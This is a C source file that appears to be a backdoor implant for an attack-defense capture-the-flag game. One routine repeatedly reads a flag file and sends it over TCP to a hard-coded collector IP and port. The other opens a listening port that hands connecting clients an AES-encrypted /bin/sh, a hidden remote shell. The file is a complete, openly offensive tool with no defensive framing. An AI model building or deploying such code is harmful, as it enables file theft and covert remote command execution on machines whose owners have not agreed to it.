#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <sys/mman.h>
#include <sys/select.h>
#include "aes.h"

//#define flag_path "/home/oc/flag"
//#define catch_ip "140.113.235.151"
//#define catch_port 12345
//#define backdoor_port 23459
#define bufsize 1024

//#define ikey "asdfzxcvqwer1234"
//#define okey "4321rewqfdsavcxz"

void catflag(){
	char buf[bufsize];
	FILE* f;
	int sockfd;
	struct sockaddr_in serv_addr;
	char flag[] = flag_path;
	char ip[] = catch_ip;

	// initialize and connect to the catcher
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	memset((char *) &serv_addr, 0, sizeof(serv_addr));
	serv_addr.sin_family = AF_INET;
	inet_pton(AF_INET, ip, &serv_addr.sin_addr);
	serv_addr.sin_port = htons(catch_port);
	connect(sockfd, (struct sockaddr*) &serv_addr, sizeof(serv_addr));

	// read file and send to the catcher
	f = fopen(flag, "r");
	while (1) {
		int rsize = fread(buf, 1, bufsize, f);
		if (rsize>0) {
			write(sockfd, buf, rsize);
		}
		else break;
	}

	// close
	fclose(f);
	close(sockfd);
}

void backdoor2(){
	pid_t childpid;
	int pipe1[2], pipe2[2];
	pipe(pipe1);
	pipe(pipe2);

	char in_key[17]=ikey;
	char out_key[17]=okey;

	childpid = fork();
	if (childpid == 0) {
		char sh[] = "/bin/sh";
		char* argv[] = { sh, NULL };
		char* env[] = { NULL };

		close(pipe1[1]); // close pipe1 writing
		close(pipe2[0]); // close pipe2 reading

		dup2(pipe1[0], 0); // io redirection
		dup2(pipe2[1], 1);
		dup2(pipe2[1], 2);

		execve(sh, argv, env);
		exit(0);
	}
	else {
		close(pipe2[1]); // close pipe2 writing
		close(pipe1[0]); // close pipe1 reading

		// start io redirection
		fd_set fds;
		int input_not_eof = 1;
		int output_not_eof = 1;

		while (output_not_eof) {
			// set fd
			FD_ZERO(&fds);
			if (input_not_eof) FD_SET(0, &fds);
			if (output_not_eof) FD_SET(pipe2[0], &fds);

			// maxfd+1, read_set, write_set, err_set, timeout
			select(pipe2[0]+1, &fds, NULL, NULL, NULL);

			int n; // number of bytes read
			char buf[bufsize]; // readbuf
			char buf2[bufsize];

			// read from user input 
			if (input_not_eof && FD_ISSET(0, &fds)) {
				memset(buf, 0, bufsize);
				memset(buf2, 0, bufsize);
				n = read(0, buf, bufsize);
				if (n > 0){
					int i;
					for (i=0; i<n; i+=16) AES128_ECB_decrypt(buf+i, in_key, buf2+i);
					write(pipe1[1], buf2, ((n-1)/16+1)*16);
				}
				else {
					input_not_eof = 0;
					close(0);
					close(pipe1[1]);
				}
			}

			// read from service output
			if (output_not_eof && FD_ISSET(pipe2[0], &fds)) {
				memset(buf, 0, bufsize);
				memset(buf2, 0, bufsize);
				n = read(pipe2[0], buf, bufsize);
				if (n > 0){	
					int i;
					for (i=0; i<n; i+=16) AES128_ECB_encrypt(buf+i, out_key, buf2+i);
					write(1, buf2, ((n-1)/16+1)*16);
				}
				else {
					output_not_eof = 0;
					close(1);
					close(pipe2[0]);
				}
			}
		}
	}
}

void backdoor(int listenfd){
	int connfd;
	struct sockaddr_in cliaddr;
	socklen_t clilen;
	pid_t childpid;
	char buf[bufsize];
	fd_set fds;
	struct timeval tm;
	int res;

	// accept
	FD_ZERO(&fds);
	FD_SET(listenfd,&fds);
	tm.tv_sec = 60;
	tm.tv_usec = 0;
	res = select(listenfd+1,&fds,NULL,NULL,&tm);
	if (res>0 && FD_ISSET(listenfd,&fds)) {
		connfd = accept(listenfd, (struct sockaddr*) &cliaddr, &clilen);

		// backdoor
		childpid = fork();
		if (childpid == 0) {
			dup2(connfd, 0);
			dup2(connfd, 1);
			dup2(connfd, 2);
			backdoor2();
			exit(0);
		}
		close(connfd);
	}
}

int main(){
	pid_t childpid;
	childpid = fork();
	if (childpid == 0) {
		int listenfd;
		struct sockaddr_in servaddr;

		// setup address
		memset(&servaddr, 0, sizeof(servaddr));
		servaddr.sin_family = AF_INET;
		servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
		servaddr.sin_port = htons(backdoor_port);

		// start listen
		listenfd = socket(AF_INET, SOCK_STREAM, 0);
		bind(listenfd, (struct sockaddr*) &servaddr, sizeof(servaddr));
		listen(listenfd, 1);

		for (childpid = fork(); childpid == 0; childpid = fork()) {
			backdoor(listenfd);
		}
	}
	else {
		for (childpid = fork(); childpid == 0; childpid = fork()) {
			catflag();
			sleep(60);
		}
	}
}

